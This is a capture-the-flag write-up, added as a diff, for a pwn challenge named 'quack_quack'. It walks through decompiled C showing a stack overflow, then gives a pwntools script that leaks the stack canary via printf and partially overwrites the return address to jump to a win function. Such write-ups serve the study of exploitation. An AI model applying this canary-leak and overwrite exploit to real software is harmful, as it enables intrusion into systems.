@@ -1,0 +1,86 @@
+* Description
+
+On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers,
+turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm, Quack
+Quack, it's time to face the Duck!
+
+* Solution
+
+First, let's running the program:
+[[file:2025-04-18_15-21.png]]
+
+There are need some input, with random string the program give us messages then exit.
+
+Let's analysis its logic in disassembler:
+#+begin_src c
+unsigned __int64 duckling()
+{
+  char *v1; // [rsp+8h] [rbp-88h]
+  _QWORD buf[4]; // [rsp+10h] [rbp-80h] BYREF
+  _QWORD buf_1[11]; // [rsp+30h] [rbp-60h] BYREF
+  unsigned __int64 v4; // [rsp+88h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(buf, 0, sizeof(buf));
+  memset(buf_1, 0, 0x50);
+  printf("Quack the Duck!\n\n> ");
+  fflush(_bss_start);
+  read(0, buf, 0x66u);
+  v1 = strstr((const char *)buf, "Quack Quack ");
+  if ( !v1 )
+  {
+    error("Where are your Quack Manners?!\n");
+    exit(1312);
+  }
+  printf("Quack Quack %s, ready to fight the Duck?\n\n> ", v1 + 32);
+  read(0, buf_1, 0x6Au);
+  puts("Did you really expect to win a fight against a Duck?!\n");
+  return v4 - __readfsqword(0x28u);
+}
+#+end_src
+
+~main~ call the ~duckling~ then exit, in this ~duckling~ function, it's seem that the first input which
+program require *must* include string "Quack Quack ". *Then it print the rest of input as string (%s)*.
+and which interesting is the next ~read~ call exist a =buffer overflow=. Cause that buf's position at
+=[rbp - 0x60]=, but ~read~ size is *0x6a*. So except the base rbp, we can overwrite the last 2 byte of
+return address.
+[[file:2025-04-18-0735.svg]]
+
+BTW, we notice that prologue of function initialize the ~v4~, which is ~stack canary~, So, we need to
+leak that value in printf!
+
+Lastly, the program has provide the *"win"* function ~duck_attack:~
+[[file:2025-04-18_15-45.png]]
+
+Until now, all we need is satisfied:
+1. leverage ~printf~ to leak =canary=.
+2. construct the payload to fill that =canary= and overwrite the return address last 2 byte to ~duck_attack~
+   
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+from pwn import *
+
+io = process('./quack_quack')
+
+canary_offset_from_buf = 0x78
+print_offset = 0x20
+# plus 1, cause last byte of canary always equal to 0, cause %s leak fail
+canary_payload = b'A' * (canary_offset_from_buf - print_offset + 1)
+canary_payload += b'Quack Quack '
+
+_ = io.sendlineafter(b'> ', canary_payload)
+_ = io.recvuntil(b'Quack Quack ')
+canary = u64(io.recv(7).rjust(8, b'\x00'))
+print(f'leak canary: {hex(canary)}')
+
+win_last2bytes = b'\x7f\x13'
+win_payload = b'A' * 0x58 + p64(canary) + b'B' * 8 + win_last2bytes
+_ = io.sendlineafter(b'> ', win_payload)
+
+_ = io.recvuntil(b'against a Duck?!')
+
+flag = io.recvall().strip(b'\n')
+
+print(flag.decode())
+#+end_src
